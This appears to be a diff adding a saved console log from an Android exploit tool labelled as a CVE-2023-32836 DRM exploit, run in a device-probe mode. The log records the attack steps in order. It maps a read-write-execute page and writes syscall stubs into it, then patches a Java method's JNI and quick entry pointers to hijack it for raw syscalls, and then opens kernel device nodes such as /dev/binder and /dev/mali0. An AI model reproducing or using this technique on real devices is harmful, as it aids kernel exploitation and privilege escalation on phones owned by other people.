@@ -1,0 +1,28 @@
+[*] CVE-2023-32836 DRM exploit (Java/dalvikvm)
+[*] pid=24228 uid=1000 mode=devprobe
+[*] === Device node probe ===
+
+[+] Scratch buffer at 0x7ceae00000
+[*] Trying anonymous PROT_RWX mmap...
+[+] Anonymous RWX page at 0x7ce8ddb000
+[+] Wrote syscall stubs: JNI@+0x00 (36B), Quick@+0x40 (36B)
+[*] ArtMethod for nativeSyscall at 0x7a49196500
+    access_flags = 0x10000108 [NATIVE]
+    data (JNI ptr) = 0x7a5141a2c0
+    entry_point    = 0x1038000812c03be0
+[*] Patching data_ (JNI) → 0x7ce8ddb000
+[*] Patching entry_point (quick) → 0x7ce8ddb040
+    data_       = 0x7ce8ddb000 ✓
+    entry_point = 0x7ce8ddb040 ✓
+[+] ArtMethod patched
+[+] Syscall infrastructure ready
+
+[OPEN] /dev/binder  fd=5
+[OPEN] /dev/hwbinder  fd=5
+[OPEN] /dev/mali0  fd=5
+[OPEN] /dev/dri/card0  fd=5
+[OPEN] /dev/apusys  fd=5
+[OPEN] /dev/aw_smartpa  fd=5
+
+[*] 6/77 devices accessible
+DEVPROBE_EXIT:0
